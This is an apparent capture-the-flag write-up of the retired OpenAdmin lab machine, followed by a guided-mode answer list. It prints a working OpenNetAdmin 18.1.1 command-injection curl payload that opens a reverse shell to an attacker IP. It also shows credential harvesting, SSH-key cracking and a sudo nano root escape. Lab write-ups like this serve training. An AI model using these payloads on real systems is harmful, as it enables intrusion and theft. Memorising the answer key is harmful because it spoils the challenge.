## - Retired Linux Machine / OpenAdmin -
- [+] :  Target IP
      >> 10.10.10.171

### Adventure Mode

## Recon
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

- [+] :  port 80 shows apache default page , lemme add openadmin.htb in dns and try again 
      >> same output .

- [+] :  dirbusting http://openadmin.htb/music/ && http://openadmin.htb/ona/
      >> directory opennetadmin open and running an old version 18.1.1
## foothold

```bash
searchsploit opennetadmin       
OpenNetAdmin 18.1.1 - Command Injection Explo | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution   | php/webapps/47691.sh
```
- [+] :  ./exploit.sh http://10.10.10.171/ona/ [make sure to write the full path otherwise you'll get redirect 301]

- [+] :  Crafted curl
      >> curl --silent -L -d "xajax=window_submit&xajaxr=$(date +%s%3N)&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo%20\"BEGIN\";%2Fbin%2Fbash+-c+%27%2Fbin%2Fbash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.4%2F4444+0%3E%261%27;echo%20\"END\"&xajaxargs[]=ping" "http://openadmin.htb/ona/" [exploiting manually for stable revshell ]
 
## www-data recon
- [+] :  mysql open , checking for some password
      >> jimmy:n1nj4W4rri0R 
```php
		db_type' => 'mysqli',
			'db_host' => 'localhost',
			'db_login' => 'ona_sys',
			'db_passwd' => 'n1nj4W4rri0R!',
			'db_database' => 'ona_default',
			'db_debug' => false,
```
        
 

## Jimmy recon

- [1] : Jimmy can access a Vhost folder called internal . 
      >> can find another password "Revealed" for jimmy in index.php
      >> in main.php , it prints the id_rsa for joanna . 
      >> cant access it , so I need to chisel .

- [2] : internal.openadmin.htb running on apache 
      >> /etc/apache2/sites-enabled/internal.conf shows internal runnong on port 52846

- [3] : client http://10.10.14.4:3636 R:52846:127.0.0.1:52846

- [4] : ssh2john.py id_rsa > hash to extract hash from ssh key 
      >> john hash --wordlist=rockyou.txt ->> "bloodninjas"
      
## Root
- [1] : sudo -l shows /bin/nano into /opt/priv 
```bash
		sudo nano
		^R^X
		reset; sh 1>&0 2>&0
```

### Guided Mode

## Tasks 

- [+] :  There are three directories on the webserver. /artwork, sierra, and what else?
      >> /music

- [+] :  On the page at /music, there is a link that doesn't point to another link on /music, but rather an administration tool. What is the relative path?
      >> /ona

- [+] :  What is the version number of OpenNetAdmin that runs on the remote machine?
      >> 18.1.1

- [+] :  What's the password of the user jimmy?
      >> n1nj4W4rri0R!

- [+] :  What's the name of the virtual host running under user "joanna"?
      >> internal.openadmin.htb

- [+] :  What's the password for joanna on the internal vhost?
      >> Revealed

- [+] :  What's the password for Joannas's private key?
      >> bloodninjas

- [+] :  What is the name of the binary (without path) that Joanna can run as root?
      >> nano


